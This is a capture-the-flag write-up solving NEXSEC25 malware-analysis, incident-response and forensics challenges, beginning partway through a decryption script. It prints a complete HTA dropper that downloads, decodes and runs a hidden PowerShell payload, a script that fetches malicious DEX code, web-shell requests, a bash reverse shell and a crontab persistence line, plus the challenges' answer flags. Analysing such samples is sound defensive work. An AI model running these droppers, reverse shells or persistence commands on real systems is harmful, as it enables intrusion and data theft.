# We need 32 bytes for AES Key + 64 bytes for HMAC Key (unused here)
dk = hashlib.pbkdf2_hmac('sha1', network_secret.encode('utf-8'), salt_bytes, iterations, 96)
aes_key = dk[:32]

# 3. Decryption Function
def decrypt_string(b64_input):
    # Decode Base64
    data = base64.b64decode(b64_input)
    
    # Structure: [HMAC (32 bytes)] [IV (16 bytes)] [Ciphertext (Rest)]
    # iv = data[32:48]
    # ciphertext = data[48:]
    
    iv = data[32:48]
    ciphertext = data[48:]

    # AES-256-CBC Decryption
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ciphertext) + decryptor.finalize()
    
    # Unpad (PKCS7)
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(padded_data) + unpadder.finalize()
    
    return decrypted_data.decode('utf-8')

# 4. Decrypt the targets
telemetry = "whQkhfaCW4dvBnzTCDW5rW6KLTU9RiSTcNwWFR/1gNP8rRfd9nuzy53BXr26J/7peazAVzWXDeL02U5ZiAQ1xbh9hBpgXzGf0/ukSaW+9mwFRwVGOnaRwSgyJpJ7KAOK"
connectivity = "KgLzmYKpZFe6P8SFkeOJyQqQdHpgagBwgiWg5GxfuQzId0L67FdiyDp8qZGyxPtUE+LOUJwuPrqsXWydzpUjsw=="

print("Domain:", decrypt_string(telemetry))
print("Port:  ", decrypt_string(connectivity))
```

**Flag:** `NEXSEC25{1k92jsas.capturextheflag.io}`

### Photo Viewer Gone Rogue

**Challenge:** 
> A user downloaded what appeared to be a legitimate photo gallery application from a third-party app store. Shortly after installation, they noticed unusual battery drain and suspicious network activity. The device's security logs show the app accessing resources it shouldn't need for a simple gallery viewer.
>
> Analyze the APK and the flag hidden in the malware.

**Solution:**

Decompile the APK file using apktool or jadx and after a while checking all the files i saw this b64 encoded
```
<string name="media_unlock">NXVwNDUzY3UyNGszeVlvX2p1NTdmMDIxaDRjazIwMjQ=</string>

<string name="splashscreen">4GWN1LWGUMR2pKAngPA+6n7lBdGLdImliS+bGCoEK8orXLtijGZF4i2AgLDqArfYwa9PQbsFh5+RTy4VqB3VfdtBsWbSR0Y1hRcjjbNeBVA=</string>
```

Script to decode it:
```
#!/usr/bin/env python3
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

MEDIA_UNLOCK_B64 = "NXVwNDUzY3UyNGszeVlvX2p1NTdmMDIxaDRjazIwMjQ="
SPLASHSCREEN_B64 = "4GWN1LWGUMR2pKAngPA+6n7lBdGLdImliS+bGCoEK8orXLtijGZF4i2AgLDqArfYwa9PQbsFh5+RTy4VqB3VfdtBsWbSR0Y1hRcjjbNeBVA="

def b64d(s: str) -> bytes:
    return base64.b64decode(s)

def main():
    key = b64d(MEDIA_UNLOCK_B64)  # key is ASCII bytes
    ct = b64d(SPLASHSCREEN_B64)

    pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
    pt = unpad(pt, 16)

    print("Key:", key.decode("utf-8", errors="replace"))
    print("Output:", pt.decode("utf-8", errors="replace"))

if __name__ == "__main__":
    main()
```
The script execution:
```
(base) ┌─[akmal@parrot]─[~/Desktop]
└──╼ $python3 solve.py
Key: 5up453cu24k3yYo_ju57f021h4ck2024
Output: https://github.com/TomatoTerbang/redesigned-robot/raw/refs/heads/main/KamGobing
```
From the output, we got a github link that had long encoded b64. After a while i downloaded the GitHub Base64 encoded and Use script and decrypt to classes.dex
<img width="975" height="292" alt="image" src="https://github.com/user-attachments/assets/76fda660-42a9-4880-a900-03de36dbd0b3" />

```
#!/usr/bin/env python3
import argparse
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def b64decode_loose(s: str) -> bytes:
    s = "".join(s.split())
    s += "=" * ((-len(s)) % 4)
    return base64.b64decode(s)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="GitHub raw URL from step 1")
    ap.add_argument("--key", required=True, help="AES key (plain text)")
    ap.add_argument("--out", default="classes.dex", help="Output dex filename")
    args = ap.parse_args()

    r = requests.get(args.url, timeout=30)
    r.raise_for_status()

    # GitHub file content is Base64 text (from your challenge)
    blob_ct = b64decode_loose(r.text)

    key = args.key.encode()
    pt = AES.new(key, AES.MODE_ECB).decrypt(blob_ct)

    # Some blobs are padded, some are not. Try unpad, fallback raw.
    try:
        pt = unpad(pt, 16)
    except ValueError:
        pass

    with open(args.out, "wb") as f:
        f.write(pt)

    print(f"[+] Wrote {args.out} ({len(pt)} bytes)")
    print("[+] Header:", pt[:8])

    if pt[:4] == b"dex\n":
        print("[+] Looks like a valid DEX")
    else:
        print("[!] Not a DEX header, check mode/key/url")

if __name__ == "__main__":
    main()
```

Strings the `classes.dex`
<img width="975" height="377" alt="image" src="https://github.com/user-attachments/assets/5e14db6c-4a4f-4230-bdfe-e508650e3f5f" />

Decrypt the base64 encoded strings by using the same key as well with script as well:

```
#!/usr/bin/env python3
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Embedded key (decoded earlier from media_unlock)
KEY = b"5up453cu24k3yYo_ju57f021h4ck2024"

# Embedded encrypted blob (from strings/classes.dex)
BLOB_B64 = "@bBJNkA2kvfETMiuzUh3PYUQMstHcXPdMZNj2c20oiZwFAWuoq7ll2umX8eNUqhFj"

def decrypt_b64_aes_ecb(key: bytes, b64s: str) -> bytes:
    if b64s.startswith("@"):
        b64s = b64s[1:]
    b64s = "".join(b64s.split())
    b64s += "=" * ((-len(b64s)) % 4)

    ct = base64.b64decode(b64s)
    pt = AES.new(key, AES.MODE_ECB).decrypt(ct)

    try:
        pt = unpad(pt, 16)
    except ValueError:
        pass

    return pt

def main():
    pt = decrypt_b64_aes_ecb(KEY, BLOB_B64)
    try:
        print(pt.decode("utf-8"))
    except UnicodeDecodeError:
        print(pt)

if __name__ == "__main__":
    main()
```
The script execution:

```
#!/usr/bin/env python3
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Embedded key (decoded earlier from media_unlock)
KEY = b"5up453cu24k3yYo_ju57f021h4ck2024"

# Embedded encrypted blob (from strings/classes.dex)
BLOB_B64 = "@bBJNkA2kvfETMiuzUh3PYUQMstHcXPdMZNj2c20oiZwFAWuoq7ll2umX8eNUqhFj"

def decrypt_b64_aes_ecb(key: bytes, b64s: str) -> bytes:
    if b64s.startswith("@"):
        b64s = b64s[1:]
    b64s = "".join(b64s.split())
    b64s += "=" * ((-len(b64s)) % 4)

    ct = base64.b64decode(b64s)
    pt = AES.new(key, AES.MODE_ECB).decrypt(ct)

    try:
        pt = unpad(pt, 16)
    except ValueError:
        pass

    return pt

def main():
    pt = decrypt_b64_aes_ecb(KEY, BLOB_B64)
    try:
        print(pt.decode("utf-8"))
    except UnicodeDecodeError:
        print(pt)

if __name__ == "__main__":
    main()
(base) ┌─[✗]─[akmal@parrot]─[~/Desktop]
└──╼ $python3 solve.py
nexsec25{dyn4m1c_d3x_kn0w13d93_941n3d!}
```

**Flag:** `nexsec25{dyn4m1c_d3x_kn0w13d93_941n3d!}`

### Birthday Trap

**Challenge:** 
> Your colleague Aminah received a birthday greeting email with an attached image file "happy_birthday.png". She mentioned seeing a warning dialog when she clicked it, but she forgot what it said then her PC started acting strange. 
> Do NOT execute or click this file!- perform static analysis only to find the flag safely.
> Analyze the happy_birthday.png and find the flag hidden in the malware. 
>
> Disclaimer: This malware sample was created exclusively for the NEXSEC CTF competition. The authors are not responsible for any damages caused by misuse. All analysis should only be performed in a secure, isolated environment such as a virtual machine or sandbox.

**Solution:**

Unzipping the attachment revealed a suspicious file named `Happy_Birthday.png.lnk`. Static with **ExifTool** showed that the shortcut does not open an image but instead executes **mshta.exe** with a remote argument pointing to **https://wonderpetak[.]github[.]io/W0nderpet4k/M[.]hta**. 
Which confirms that the `.lnk` file is being used as a dropper to fetch and run malicious code from an external source.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ exiftool Happy_Birthday.png.lnk 
ExifTool Version Number         : 13.25
File Name                       : Happy_Birthday.png.lnk
Directory                       : .
File Size                       : 1458 bytes
File Modification Date/Time     : 2025:12:11 19:29:20+08:00
File Access Date/Time           : 2025:12:15 02:11:20+08:00
File Inode Change Date/Time     : 2025:12:15 02:11:20+08:00
File Permissions                : -rw-rw-r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2023:12:04 10:50:07+08:00
Access Date                     : 2025:12:12 11:28:07+08:00
Modify Date                     : 2023:12:04 10:50:07+08:00
Target File Size                : 43520
Icon Index                      : 324
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : mshta.exe
Drive Type                      : Fixed Disk
Drive Serial Number             : 1000-BA1A
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\mshta.exe
Relative Path                   : ..\..\..\Windows\System32\mshta.exe
Working Directory               : C:\Windows\System32
Command Line Arguments          : https://wonderpetak.github.io/W0nderpet4k/M.hta
Icon File Name                  : %SystemRoot%\System32\SHELL32.dll
Machine ID                      : desktop-a6ci3ba
```
From the `.hta`, we extracted a secondary file: Content of `.hta` **https://wonderpetak[.]github[.]io/W0nderpet4kk/wct9D39[.]jpg**:

```
<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION ID="Si" 
APPLICATIONNAME="Downloader"
WINDOWSTATE="minimize"
MAXIMIZEBUTTON="no"
MINIMIZEBUTTON="no"
CAPTION="no"
SHOWINTASKBAR="no">
<script>
function XLKJSDGOODOGOGOGo(xaksldfijfijgika) {
a = new ActiveXObject("Wscript.Shell");
a.Run(xaksldfijfijgika, 0);
}
function OCKJOIFJIOGGOGOGOf(xaksldfijfijgika) {
b = new ActiveXObject("Wscript.Shell");
b.Run(xaksldfijfijgika, 0);
}
function liociaskdjlkdlakfk(xaksldfijfijgika) {
c = new ActiveXObject("Wscript.Shell");
c.Run(xaksldfijfijgika, 0);
}
function LSJDiJLKDJOGOGOGOfn(n){
var d = new ActiveXObject("WScript.Shell");
d.Run("%comspec% /c ping -n " + n + " 127.0.0.1 > nul", 0, 1);
d = null;
}
XLKJSDGOODOGOGOGo("https://archiveimage.github.io/Pictures/Happy_Birthday.jpeg");
LSJDiJLKDJOGOGOGOfn(3);
XLKJSDGOODOGOGOGo("curl https://wonderpetak.github.io/W0nderpet4kk/wct9D39.jpg -o %TEMP%\\wct9D39.jpg");
LSJDiJLKDJOGOGOGOfn(5);
OCKJOIFJIOGGOGOGOf("certutil.exe -decode %TEMP%\\wct9D39.jpg %TEMP%\\wct9D39.tmp");
LSJDiJLKDJOGOGOGOfn(3);
OCKJOIFJIOGGOGOGOf("powershell.exe -NoProfile -Command \"$xorKey=0x42; $bytes=[IO.File]::ReadAllBytes($env:TEMP+'\\wct9D39.tmp'); $decoded=@(); foreach($b in $bytes){$decoded+=$b -bxor $xorKey}; [IO.File]::WriteAllBytes($env:TEMP+'\\winp.ps1',[byte[]]$decoded)\"");
LSJDiJLKDJOGOGOGOfn(2);
OCKJOIFJIOGGOGOGOf("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File %TEMP%\\winp.ps1");
LSJDiJLKDJOGOGOGOfn(2);
liociaskdjlkdlakfk("cmd /c del /f /q %TEMP%\\winp.ps1 %TEMP%\\wct9D39.tmp %TEMP%\\wct9D39.jpg");
</script>
</head>
<body>
</body>
</html>
```
The `.jpg` file was not an image but an encoded payload. Use Base64 to decode the file contents and apply XOR decryption with **key 0x42** (from .hta)
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl  https://wonderpetak.github.io/W0nderpet4kk/wct9D39.jpg
-----BEGIN CERTIFICATE-----
YWIMJzoxJyFiARYEYgEqIy4uJywlJ2JvYg8jLjUjMCdiAywjLjsxKzFIYWIDNzYq
LTB4YgMSFmIRKy83LiM2Ky0sYhYnIy9IYWIGIzYneGJwcnB3b3Nwb3NwSGFIYWIQ
BwMOYgQOAwV4YiwnOjEnIXBycHc5EnI1cTARKnEuLh0Bci8vcSw2dx0KcyZxHRFx
ITBxNjFjP0hhSGFiFQMQDAsMBXhiFiorMWIrMWIjYjErLzcuIzYnJmIvIy41IzAn
YjIjOy4tIyZiJC0wYicmNyEjNistLCMuYjI3MDItMScxSGFiCyRiOy03ZTAnYjEn                                                                                                                                           
JyssJWI2KisxYiA7Yic6JyE3NissJWI2KidiJCsuJ25iOy03ZTAnYiYtKywlYis2                                                                                                                                           
YhUQDQwFY0hhYhAnIy5iLyMuNSMwJ2IjLCMuOzE2MWIMBxQHEGInOichNzYnYjcs
KSwtNSxiJCsuJzFiJiswJyE2LjtjSGFIYWISMC0kJzExKy0sIy5iLyMuNSMwJ2Ij
LCMuOzErMWIwJzM3KzAnMXhIYWJzbGIRNiM2KyFiIywjLjsxKzFiBAsQERZiaiMs
Iy47OCdiNSs2Ki03NmInOichNzYrLCVrSGFicGxiFywmJzAxNiMsJissJWI2Kidi
IzY2IyEpYiEqIyssSGFicWxiECc0JzAxJ2InLCUrLCcnMCssJWItICQ3MSEjNicm
YiEtJidIYWJ2bGIEKywmKywlYiorJiYnLGILDQExYiMsJmInLCEwOzI2Ky0sYikn
OzFIYUhhYhYqJ2IwJyMuYiQuIyViKzFiKyxiNionYgENDw8HDBYRYiMgLTQnYm9i
IDc2YjstN2IxKi03LiZiKiM0J2IkLTcsJkhhYjYqKzFiNiowLTclKmIyMC0yJzBi
MTYjNishYiMsIy47MSsxbmIsLTZiIDtiJzonITc2KywlYjE3MTIrISstNzFiJCsu
JzFjSEgkNywhNistLGIRKi01bwQjKScPJzExIyUnYjlIYmJiYjIjMCMvahkxNjAr
LCUfZi8xJWtIYmJiYkhiYmJiYWIGKzEyLiM7YiYnIS07YiQuIyViNi1iLysxLicj
JmIzNyshKWIjLCMuOzErMUhiYmJiZiYnIS07BC4jJWJ/YmAEAwkHHQQOAwU5BnIs
Nh0INzE2HXE6cSE3NnEdFywpLHI1LB0Ecy5xMWM/YEhiYmJiSGJiYmIDJiZvFjsy
J2JvAzExJy8gLjsMIy8nYhE7MTYnL2wVKywmLTUxbAQtMC8xSGJiYmIZETsxNicv
bBUrLCYtNTFsBC0wLzFsDycxMSMlJwAtOh94eBEqLTVqSGJiYmJiYmJiYKDY4q36
zWIVAxAMCwwFYqDY4q36zSIsIiwbLTdiJzonITc2JyZiIyxiNywpLC01LGIkKy4n
YjUrNiotNzZiIywjLjs4KywlYis2YiQrMDE2YyIsIiwLLGIwJyMuYjEhJywjMCst
MW5iNiorMWIhLTcuJmIgJ2IjITY3Iy5iLyMuNSMwJ2MiLCIsBCMpJ2IELiMleGJm
JichLTsELiMlIiwiLA4nMTEtLHhiAy41IzsxYjInMCQtMC9iERYDFgsBYgMMAw4b
EQsRYiAnJC0wJ2InOichNzYrLSxjIiwiLAorLDZ4YgMsIy47OCdiNionYicsNisw
J2IjNjYjISliISojKyxiNi1iJCssJmI2KidiMCcjLmIkLiMlbGBuSGJiYmJiYmJi
YBEnITcwKzY7YhUjMCwrLCVib2IMJzoxJyFiARYEYG5IYmJiYmJiYmIZETsxNicv
bBUrLCYtNTFsBC0wLzFsDycxMSMlJwAtOgA3NjYtLDEfeHgNCW5IYmJiYmJiYmIZ
ETsxNicvbBUrLCYtNTFsBC0wLzFsDycxMSMlJwAtOgshLSwfeHgVIzAsKywlSGJi
YmJrSD9ISGFiDyMrLGInOichNzYrLSxINjA7YjlIYmJiYhEqLTVvBCMpJw8nMTEj
JSdiby8xJWJgBzonITc2JyZgSGJiYmJIYmJiYmFiCyxiI2IwJyMuYiM2NiMhKW5i
NiorMWIrMWI1KicwJ2IvIy4rISstNzFiIS0mJ2I1LTcuJmIwNyxIYmJiYmFiBC0w
YjYqKzFiARYEbmI1J2IoNzE2YjEqLTViI2I1IzAsKywlYi8nMTEjJSdIYmJiYkg/
YiEjNiEqYjlIYmJiYhUwKzYnbwotMTZiYAcwMC0weGJmamYdbAc6IScyNistLGwP
JzExIyUna2BibwQtMCclMC03LCYBLS4tMGIQJyZIP0hIYWIHJjchIzYrLSwjLmIs
LTYneEhhYhYqJ2IwJyMuYiQuIyViNSMxYissYjYqJ2IhLS8vJyw2MWIjNmI2Kidi
Ni0yYi0kYjYqKzFiJCsuJ2xIYWIbLTdiMSotNy4mYiojNCdiLSA2IyssJyZiNior
MWI2KjAtNyUqYjE2IzYrIWIjLCMuOzErMXhIYWJzbGIDLCMuOzgnYjYqJ2IrLCs2
KyMuYiQrLidiaiYtLGU2Yic6JyE3Nidja0hhYnBsYhcsJicwMTYjLCZiKi01YiQr
LicxYiMwJ2ImLTUsLi0jJicmYiMsJmImJyEtJicmSGFicWxiBzo2MCMhNmIjLCZi
JichLSYnYjYqJ2IhJzA2KyQrISM2J0hhYnZsYgYnLSAkNzEhIzYnbSYnITA7MjZi
Ni1iJSc2YjYqKzFiMSEwKzI2SGFid2xiECcjJmI2KidiMS03MCEnYiEtJidiajYq
J2IhLS8vJyw2MWNrYjYtYiQrLCZiNionYiQuIyVIYUhhYhAnLycvICcweGIMBxQH
EGInOichNzYnYjE3MTIrISstNzFiJCsuJzFiNSs2Ki03NmIyMC0yJzBiIywjLjsx
KzFjSA==
-----END CERTIFICATE-----
```

<img width="975" height="583" alt="image" src="https://github.com/user-attachments/assets/e7382c91-50d1-4c30-85a3-a6801e525452" />


**Flag:** `nexsec2025{P0w3rSh3ll_C0mm3nt5_H1d3_S3cr3ts!}`

## Incident Response

### Here’s the Dump #1

**Challenge:** 
> You receive an encrypted disk dump from a client in rural Transylvania, where a series of unexplained system outages have been spreading through the region like an unseen contagion. The client reports that their workstation became “strangely alive” before crashing—screens flickering, unauthorized processes appearing only to vanish seconds later. 
>
> One of the victim had downloaded suspicious file.
> Due to not leave any traces, the file is deleted but we as analyst should never give up! Try find the hash of the file! Good luck! (SHA1)
> 
> Download: https://drive.google.com/file/d/1vINYXwHBGCVzsJ6bmqmmSqcKrtzrObDS/view?usp=sharing

**Solution:**

From the drive, we were given zip file containing **$DH, $DS, $SII, Windows.Triage.SDS.json** files, **C and Windows.KapeFiles.Targets** folder. 

<img width="268" height="197" alt="image" src="https://github.com/user-attachments/assets/c09fb30e-356b-4d21-8c11-1f4738e2558d" />

Opened the folder content with **FTK Imager**. The goal is to prove the Windows artifacts exist and then extract the exact artifact that contains the hash (most likely **Amcache.hve**).

<img width="903" height="188" alt="image" src="https://github.com/user-attachments/assets/5c41b7a7-20ac-48c7-8161-38b144f46b00" />

Export the **Amcache.hve** so we can review further by using **[Registry Explorer](https://github.com/radtek/RegExp)**. During discovery with **amcache.hve**, we find `a.exe` which look suspicious (no publisher, version, product name, deleted, was inside download folder)

<img width="975" height="278" alt="image" src="https://github.com/user-attachments/assets/1af1c6c6-b72b-4c1b-a9d0-e5ad0316beb1" />

In Amcache, that FileId is the SHA1 (with a 0000 prefix).
the SHA1: a86dfbc01e9f834ed18b3e7bfc183d1381a5aac4 

**Flag:** `NEXSEC25{a86dfbc01e9f834ed18b3e7bfc183d1381a5aac4}`

### Here's the Dump #2

**Challenge:**
> Local rumors speak of a shadowy outbreak affecting networks across several small towns, always beginning at night, always leaving behind the same digital residue: a corrupted disk and a user who swears they heard faint whispers from their speakers before the system went dark.
>
> Your task as the digital forensic analyst:
> Dissect the disk image, trace the origin of this outbreak, and uncover whatever breached the system—before it spreads further.
>
> Where was the RAT file downloaded from?
>
> Flag format: NEXSEC25{http://xx.xx/x/x.ext}

**Solution:**

Analyze Windows **PowerShell.evtx** to find anything. find encoded Base64 string on event 400. Event id 400: Logs when the PowerShell engine starts, changing state from "none" to "available," capturing script execution for monitoring, often seen with IDs 4104, 400, 800 for command tracking.

<img width="975" height="323" alt="image" src="https://github.com/user-attachments/assets/dbbaf3b3-7aae-4002-a8a0-48acb3ad7be7" />

Decode it 

<img width="975" height="254" alt="image" src="https://github.com/user-attachments/assets/35253ee1-40dd-4cb6-95ac-2ade70bbad4d" />

And from here we find:
- Download from http[:]//osdsoft[.]com/download/updater[.]exe 
```DownloadFile('http[:]//osdsoft[.]com/download/updater[.]exe','a.exe')```

- Executes it
```shellexecute('a.exe')```

- Hides it
```(get-item 'a.exe').Attributes += 'Hidden'```

This should be where it come from

**Flag:** `NEXSEC25{http://osdsoft.com/download/updater.exe}`

### Breadcrumbs #1

**Challenge:** 
> TechHire Solutions prided themselves on finding the perfect candidates. But someone applied for more than just a job. They received a job application that wasn't what it seemed. The attacker left but not without leaving breadcrumbs behind.
> You've been called in as an incident responder. The web logs are waiting. Follow the trail!
>
> Among thousands of legitimate visitors, one IP address stands out as suspicious. What is the attacker's IP address?
> Flag format : nexsec25{ip}

**Solution:** 

I finalized this IP as the attacker due to actions of this IP during observation i find for Breadcrumbs #2 - Breadcrumbs #3. Webshell, Rev connection? It’s totally confirmed!

**Flag:** `nexsec25{192.168.21.102}`

### Breadcrumbs #2

**Challenge:**
> The attacker uploaded a malicious file. What is the full filename? Flag format : nexsec25{file.py}

The log snippet prove **resume_aiman.pdf.php** being used as a web shell due to cmd (malicious file). General question, Why does resume required **.php**, query string operator and a parameter? So fishy!!

```
192.168.21.102 - - [13/Dec/2025:02:16:10 +0800] "GET /uploads/resume_aiman.pdf.php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
```

**Flag:** `nexsec25{resume_aiman.pdf.php}`

### Vreadcrumbs #3

**Challenge:**

> What was the timestamp when the attacker uploaded the malicious file?
> Flag format: nexsec25{12/Dec/2012:12:12:12 +0800}

**Solution:**

Normally, we expect to see **POST** requests before the first time a malicious file is used. In this incident, however, host `192.168.21.102` did not generate any prior **POST** requests related to the web shell before it interacted with. The log shows only a **single relevant POST** request.

```
192.168.21.102 - - [13/Dec/2025:02:13:37 +0800] "POST /submit.php HTTP/1.1" 200 1218 "http://192.168.8.36/submit.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
```

The attacker uploaded the malicious file at the following timestamp [13/Dec/2025:02:13:37 +0800]

**Flag:** `nexsec25{13/Dec/2025:02:13:37 +0800}`

### Breadcrumbs #4

**Challenge:** 
> The attacker executed multiple commands through the webshell. What was the first command?
> Flag format : nexsec25{pwd}

**Solution:**

The first command executed right after the file uploaded.
```
192.168.21.102 - - [13/Dec/2025:02:16:10 +0800] "GET /uploads/resume_aiman.pdf.php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
```
**Flag:** `nexsec25{whoami}`

### Breadcrumbs #5

**Challenge:**
> From the webshell commands, the attacker was preparing for the next stage of the attack. What IP address and port was the attacker planning to connect back to? Flag format : nexsec25{ip:port}

**Solution:**

The attacker first attempted to check which binaries were available on the compromised system:
```which python3 php nc bash curl wget```
In the next action, the attacker used bash to initiate a reverse connection back to their own machine:
```bash -c 'bash -i >& /dev/tcp/172.16.23.13/4444 0>&1'```

```
192.168.21.102 - - [13/Dec/2025:02:19:56 +0800] "GET /uploads/resume_aiman.pdf.php?cmd=which%20python3%20php%20nc%20bash%20curl%20wget HTTP/1.1" 200 323 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

192.168.21.102 - - [13/Dec/2025:02:23:09 +0800] "GET /uploads/resume_aiman.pdf.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.16.23.13%2F4444%200%3E%261%27 HTTP/1.1" 200 215 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
```
The attacker was preparing a reverse shell connection to: `172.16.23.13:4444`

**Flag:** `nexsec25{172.16.23.13:4444}`

 
### Breadcrumbs #6

**Challenge:**
> Following the webshell upload, the attacker established a reverse shell connection. Analyze the captured traffic to uncover their activities on the compromised system.
> What is the first full command the attacker executed after gaining the reverse shell connection?
> Note : This PCAP file will be used for all remaining Breadcrumbs questions.
> Flag format : nexsec25{flag}

**Solution:**

After the webshell upload, the attacker established a reverse shell connection. We need to analyze the captured traffic in the provided `.pcap` file to determine the first full command executed once the attacker gained shell access. 

<img width="975" height="238" alt="image" src="https://github.com/user-attachments/assets/fb5b3ad5-3840-4357-9701-ae8410485713" />

The first full command executed by the attacker after gaining the reverse shell is revealed in **Stream 17** of the `.pcap`.

<img width="726" height="484" alt="image" src="https://github.com/user-attachments/assets/2704c3ef-2aa7-4609-9f9a-63a4a431a04d" />

**Flag:** `nexsec25{cat /etc/os-release}`

### Breadcrumbs #7

**Challenge:**
> Under which user context was the attacker operating after gaining the reverse shell? 
> Flag format : nexsec25{flag}

**Solution:**

From Breadcrumbs #6 the output shows that the shell was running under the **www-data** user.
This is expected since the reverse shell was spawned through a PHP webshell, which typically runs under the web server’s default user account

**Flag:** `nexsec25{www-data}`

### Breadcrumbs #8

**Challenge:**
> In which directory was the attacker initially located when the reverse shell connected?
> Flag format : nexsec25{flag}

**Flag:** `nexsec25{/var/www/html/uploads}`

### Breadcrumbs #9

**Challenge:**
> The attacker attempted to read a file containing password hashes but was denied. What file was this? (include path)

**Solution:**
From screenshot provided, we find that the user tried to read the content of **/etc/shadow** by using **cat** binary.

<img width="645" height="358" alt="image" src="https://github.com/user-attachments/assets/e8fbfb61-fd46-40c4-8c84-40cb7e339bc2" />

**Flag:** `nexsec25{/etc/shadow}`

### Breadcrumbs #10

**Challenge:**
> What command did the attacker use to search for SUID binaries on the system?

They ran the following command to list all files with the SUID:

<img width="397" height="390" alt="image" src="https://github.com/user-attachments/assets/51264c7d-3ff9-4c40-ab97-cc42a6332d5e" />

```
find / -perm -4000 -type f 2>/dev/null
```

**Flag:** `nexsec25{find / -perm -4000 -type f 2>/dev/null}`

### Breadcrumbs #11

**Challenge:**
> The attacker established persistence. What is the full command used?

**Solution:**
The attacker checked for existing cron jobs with **crontab -l**. Since no crontab was set for **www-data**, they added a new entry. The cron job runs every minute and spawns a reverse shell back to the attacker’s IP and port.

<img width="904" height="416" alt="image" src="https://github.com/user-attachments/assets/aec5ef1a-db4e-458d-89cf-8d47308db1a7" />

**Flag:** `nexsec25{(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.16.23.13/4444 0>&1'") | crontab -}`

### Breadcrumbs #12

**Challenge:**
> What command did the attacker use to list active network connections and listening ports in the second reverse shell session?

**Solution:**

Challenge required the second reverse shell session which from another tcp stream. And we find stream 23 as the new attacker session.

<img width="775" height="491" alt="image" src="https://github.com/user-attachments/assets/aa61028a-0fa5-4ca6-abdc-e02dd0703d8f" />

Command use to list active network: **ss -tulpn**

**Flag:** `nexsec25{ss -tulpn}`

### Breadcrumbs #13

**Challenge:**
> What user's home directory that the attacker tried to access?

**Solution:**

The attacker first lists down what users from home directory and try to list all the folder and files in its home directory however get denied

<img width="727" height="773" alt="image" src="https://github.com/user-attachments/assets/9d9db9c6-e54f-45a2-a754-7950a2fbbcad" />

**Flag:** `NEXSEC25{sysadmin}`

### Security Incident

**Challenge:** 
> A critical security alert was triggered on one of the company's servers. Forensic analysts collected event logs and system artifacts, but the initial reports are incomplete.
> 
> Examine the provided logs and determine when an unauthorized user successfully gained access to the system and identify the compromised account. Provide the username, 
> timestamp in GMT+8 and replace spaces with underscores.
> 
> FLAG FORMAT: nexsec25{MM/DD/YYYY_HH:MM:SSAM/PM_USERNAME}

**Solution:**
This one, actually I used kape and convert the .evtx to csv. But idk why, the log order is incorrect. I do sanity check with chall creator. And he said, do it the old ways. So keep in mind. From past minutes spending to solve this question, I have noticed, 100.96.0.32 is the only remote ip trying to access the machine, that consistently bruteforcing the machine. And as I said, from the log we noticed two bruteforced that give 4624 in return is aroun 12:35 and 12:38 if im not mistaken (I don’t have enough time to screenshot all the stuff, got 30 minutes more for writeup submission and I just woke up!!!) 
So here’s the event log viewer screnshots I have:

<img width="836" height="638" alt="image" src="https://github.com/user-attachments/assets/279c8f57-5354-49a8-8753-00f13f1b6fa8" />

**Flag:** `nexsec25{12/13/2025_12:35:23PM_webadmin}`

## Digital Forensics

### OhMyFiles (Initial Discovery)

**Overview:**
```
Read the file incident_summary.txt to understand the context of this case. A forensic disk image of the user’s workstation has been provided. As a forensic analyst, your first step is to verify the integrity of the evidence.

//incident_summary.txt
====================================================
              INCIDENT SUMMARY REPORT
====================================================

User: En. Fakhri  
Reported Issue: Encrypted and unreadable work document

----------------------------------------------------
                DESCRIPTION OF EVENT
----------------------------------------------------
En. Fakhri contacted the IT Security team with an urgent issue.  
He was preparing to send an important document named:

    BigClient_Proposal_2025.docx

However, he discovered that the file had been encrypted and was no longer readable.

----------------------------------------------------
                 USER ACTIVITIES
----------------------------------------------------
Before the incident occurred, Fakhri reported that he:

1. Downloaded a compressed archive (.rar file) earlier that day.
2. The archive contained a resume template.
3. He extracted the contents.
4. He then deleted the .rar file after extraction.

----------------------------------------------------
             FORENSIC ACTION TAKEN
----------------------------------------------------
The IT Security team created a forensic image of Fakhri’s workstation  
for detailed investigation and recovery of encrypted files.

Disk Image: 
https://drive.google.com/file/d/10lWQikC5PVNoKDDi_aav1WqK0BGYNqRJ/view?usp=sharing

----------------------------------------------------
                    END OF FILE
====================================================
```

### OhMyFiles #1

**Challenge:**
> Calculate the SHA256 of the disk image (.E01) and provide it as your answer. Flag Format: nexsec25{hashvalue}
